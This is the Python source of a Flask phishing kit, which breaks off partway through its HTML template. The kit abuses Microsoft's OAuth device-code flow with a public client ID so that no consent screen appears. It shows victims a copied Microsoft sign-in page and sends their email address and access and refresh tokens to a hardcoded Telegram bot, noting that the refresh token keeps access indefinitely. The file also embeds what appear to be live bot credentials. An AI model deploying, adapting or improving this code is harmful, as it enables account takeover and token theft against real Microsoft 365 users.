import os
import time
import uuid
import json
import requests
from flask import Flask, request, jsonify, render_template_string, make_response
from threading import Thread

app = Flask(__name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft Device Code Flow Constants
# Using a public client ID (Azure PowerShell) to avoid consent screen
CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2" 
RESOURCE = "https://graph.microsoft.com"
TENANT = "common"

# In-memory storage for active phishing sessions
# Structure: { vid: { "device_code": "...", "user_code": "...", "interval": 5, "expires_in": 900, "status": "pending" } }
SESSIONS = {}

# --- TELEGRAM HELPER ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID, 
            "text": message, 
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        if resp.status_code == 200:
            print(f"[TG] Sent successfully")
        else:
            print(f"[TG ERROR] {resp.text}")
    except Exception as e:
        print(f"[TG EXCEPT] {e}")

# --- MICROSOFT API HELPERS ---

def initiate_device_flow():
    """Step 1: Get device code and user code from Microsoft"""
    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
    data = {
        "client_id": CLIENT_ID,
        "scope": "openid profile offline_access https://graph.microsoft.com/.default",
        "resource": RESOURCE # Required for some legacy endpoints
    }
    try:
        resp = requests.post(url, data=data)
        if resp.status_code == 200:
            return resp.json()
        else:
            print(f"[MS ERROR] Initiate failed: {resp.text}")
            return None
    except Exception as e:
        print(f"[MS EXCEPT] {e}")
        return None

def poll_for_token(device_code, interval):
    """Step 3: Poll for the token after victim logs in"""
    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
    
    while True:
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": CLIENT_ID,
            "device_code": device_code,
        }
        try:
            resp = requests.post(url, data=data)
            result = resp.json()
            
            # Case 1: Success! We got the tokens
            if resp.status_code == 200:
                return result
            
            # Case 2: Authorization Pending (User hasn't logged in yet)
            elif result.get("error") == "authorization_pending":
                time.sleep(interval)
                continue
                
            # Case 3: Slow Down (Microsoft says wait longer)
            elif result.get("error") == "slow_down":
                interval += 5
                time.sleep(interval)
                continue
                
            # Case 4: Expired or other error
            else:
                print(f"[POLL ERROR] {result}")
                return None
                
        except Exception as e:
            print(f"[POLL EXCEPT] {e}")
            return None

def handle_successful_auth(vid, tokens):
    """Process and exfiltrate the stolen tokens"""
    access_token = tokens.get("access_token")
    refresh_token = tokens.get("refresh_token")
    id_token = tokens.get("id_token")
    
    # Decode ID Token to get email (simple base64 decode of payload)
    email = "Unknown"
    try:
        parts = id_token.split('.')
        if len(parts) == 3:
            payload = parts[1]
            # Add padding if necessary
            payload += '=' * (4 - len(payload) % 4)
            import base64
            decoded = base64.urlsafe_b64decode(payload)
            user_info = json.loads(decoded)
            email = user_info.get("preferred_username", user_info.get("upn", "Unknown"))
    except:
        pass

    msg = (
        f"<b>🔥 VICTIM AUTHENTICATED 🔥</b>\n\n"
        f"<b>Email:</b> <code>{email}</code>\n"
        f"<b>VID:</b> <code>{vid}</code>\n\n"
        f"<b>ACCESS TOKEN:</b>\n<code>{access_token}</code>\n\n"
        f"<b>REFRESH TOKEN:</b>\n<code>{refresh_token}</code>\n\n"
        f"<i>Use the Refresh Token to maintain access indefinitely.</i>"
    )
    
    # Send to Telegram
    send_telegram(msg)
    
    # Update session status
    if vid in SESSIONS:
        SESSIONS[vid]["status"] = "completed"
        SESSIONS[vid]["tokens"] = tokens
        SESSIONS[vid]["email"] = email

# --- FLASK ROUTES ---

@app.route("/")
def index():
    """Step 1: Generate a new phishing session"""
    vid = str(uuid.uuid4())
    
    # Get codes from Microsoft
    flow_data = initiate_device_flow()
    
    if not flow_data:
        return "Error initiating service. Please try again.", 500
        
    # Store session info
    SESSIONS[vid] = {
        "device_code": flow_data["device_code"],
        "user_code": flow_data["user_code"],
        "verification_uri": flow_data["verification_uri"],
        "interval": flow_data.get("interval", 5),
        "expires_in": flow_data.get("expires_in", 900),
        "status": "pending",
        "created_at": time.time()
    }
    
    # Start polling in background thread
    t = Thread(target=poll_and_capture, args=(vid, flow_data["device_code"], flow_data.get("interval", 5)))
    t.daemon = True
    t.start()
    
    # Render the phishing page
    return render_template_string(PHISHING_TEMPLATE, 
                                  user_code=flow_data["user_code"],
                                  verification_uri=flow_data["verification_uri"],
                                  vid=vid)

def poll_and_capture(vid, device_code, interval):
    """Background thread to wait for victim login"""
    print(f"[START POLL] Vid: {vid}")
    tokens = poll_for_token(device_code, interval)
    
    if tokens:
        print(f"[SUCCESS] Vid: {vid} authenticated!")
        handle_successful_auth(vid, tokens)
    else:
        print(f"[FAILED/EXPIRED] Vid: {vid}")
        if vid in SESSIONS:
            SESSIONS[vid]["status"] = "expired"

@app.route("/status/<vid>")
def check_status(vid):
    """AJAX endpoint to check if victim has logged in"""
    session = SESSIONS.get(vid)
    if not session:
        return jsonify({"status": "invalid"})
        
    return jsonify({
        "status": session["status"],
        "email": session.get("email")
    })

# --- PHISHING PAGE TEMPLATE ---
# Mimics Microsoft Device Login Page
PHISHING_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            text-align: left;
        }
        .logo {
            margin-bottom: 24px;
        }
        .logo img {
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #1b1b1b;
        }
        p {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .code-box {
            background-color: #f2f2f2;
            padding: 10px;
            font-size: 24px;
            font-weight: 600;
            letter-spacing: 2px;
            text-align: center;
            margin: 20px 0;
            border: 1px solid #ccc;
            cursor: pointer;
        }
        .btn {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover {
            background-color: #005da6;
        }
        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #666;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0067b8;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Microsoft Logo SVG -->
            <svg width="108" height="23" viewBox="0 0 108 23" xmlns="http://www.w3.org/2000/svg">
                <path fill="#F25022" d="M1 1h10v10H1z"/>
                <path fill="#7FBA00" d="M12 1h10v10H12z"/>
                <path fill="#00A4EF" d="M1 12h10v10H1z"/>
                <path fill="#FFB900" d="M12 12h10v10H12z"/>
                <path fill="#737373" d="M26.5 22h-2.2v-8.4h-3.6V22h-2.2v-11.8h2.2v1.6h3.6v-1.6h2.2zm6.6-11.8h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3zm13.5 0h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3zm11.6 5.3c0-2.7 2-4.8 4.6-4.8 2.6 0 4.6 2.1 4.6 4.8 0 2.7-2 4.8-4.6 4.8-2.6 0-4.6-2.1-4.6-4.8zm2.3 0c0 1.5 1 2.6 2.3 2.6 1.3 0 2.3-1.1 2.3-2.6 0-1.5-1-2.6-2.3-2.6-1.3 0-2.3 1.1-2.3 2.6zm13.7-5.3h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3zm10.3 0h2.2v1.6c.7-1.1 1.8-1.7 3.1-1.7 2.2 0 3.7 1.6 3.7 4.1V22h-2.3v-6.4c0-1.3-.7-2.1-1.9-2.1-1.3 0-2.2 1-2.2 2.5V22h-2.3zm13.6 0h2.2v1.5c.6-1 1.6-1.6 2.8-1.6.3 0 .6 0 .9.1v2.3c-.4-.1-.8-.2-1.2-.2-1.3 0-2.4 1-2.4 2.6V22h-2.3z"/>
            </svg>
        </div>
        
        <h1>Sign in</h1>
        <p>To sign in, use your phone's camera to scan the QR code, or enter the code below at:</p>
        <p style="font-weight: 600; color: #0067b8;">{{ verification_uri }}</p>
        
        <div class="code-box" id="codeBox" onclick="copyCode()">
            {{ user_code }}
        </div>
        <p style="font-size: 13px; color: #666; text-align: center;">Click code to copy</p>

        <div id="statusMsg" style="margin-top: 20px; font-size: 14px; color: #0067b8; display: none;">
            <span class="loader"></span> Waiting for you to sign in...
        </div>

        <div id="successMsg" class="hidden" style="margin-top: 20px; font-size: 14px; color: green; font-weight: bold;">
            ✅ Sign-in successful! You may close this window.
        </div>

        <div class="footer">
            &copy; 202
